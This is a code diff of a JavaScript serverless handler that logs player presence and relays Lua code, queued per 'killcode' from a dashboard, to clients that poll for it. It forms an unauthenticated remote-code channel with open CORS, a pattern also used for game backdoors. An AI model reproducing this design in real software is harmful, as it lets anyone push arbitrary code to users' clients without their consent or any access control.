@@ -1,29 +1,26 @@
-let commands = {}; // key = killcode, value = { lua: "code here" }
+let liveLua = {}; // store single live Lua per killcode
 
 export default function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
+    const { killcode, player, userid, lua, timestamp, poll } = req.query;
 
-    const { killcode, player, userid, lua } = req.query;
-
-    // Presence update
-    if (player && userid && killcode) {
+    // Presence
+    if(player && userid && killcode){
         console.log(`[Presence] ${player} (${userid}) with killcode ${killcode} is online`);
     }
 
-    // Inject Lua code
-    if (lua && killcode) {
-        commands[killcode] = { lua }; // store only latest
+    // Send Lua from dashboard
+    if(lua && killcode){
+        liveLua[killcode] = lua; // overwrite any previous code
         console.log(`[Lua queued] ${killcode}: ${lua}`);
-        res.status(200).json({ status: "ok", message: "Lua sent" });
-        return;
+        return res.status(200).json({ status: "ok", message: "Lua sent" });
     }
 
     // Player polling
-    if (killcode) {
-        const cmd = commands[killcode] || {};
-        commands[killcode] = {}; // consume immediately
-        res.status(200).json(cmd);
-        return;
+    if(killcode && poll){
+        const code = liveLua[killcode] || null;
+        liveLua[killcode] = null; // consume immediately
+        return res.status(200).json({ lua: code });
     }
 
     res.status(200).json({ status: "ok" });
